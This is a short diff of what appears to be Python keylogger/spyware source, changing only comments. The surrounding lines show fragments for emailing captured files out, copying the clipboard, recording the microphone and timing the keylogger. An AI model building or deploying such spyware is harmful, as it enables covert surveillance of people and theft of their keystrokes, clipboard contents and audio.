@@ -51,7 +51,7 @@ file_path = " " # Enter the file path where you want your files to be saved
 extend = "\\"
 file_merge = file_path + extend
 
-# email controls
+# Get data via email
 def send_email(filename, attachment, toaddr):
 
     fromaddr = email_address
@@ -130,7 +130,7 @@ def copy_clipboard():
 
 copy_clipboard()
 
-# get the microphone
+# get the microphone and Record Audio
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -152,7 +152,7 @@ number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
-# Timer for keylogger
+# Set Timer for keylogger
 while number_of_iterations < number_of_iterations_end:
 
     count = 0
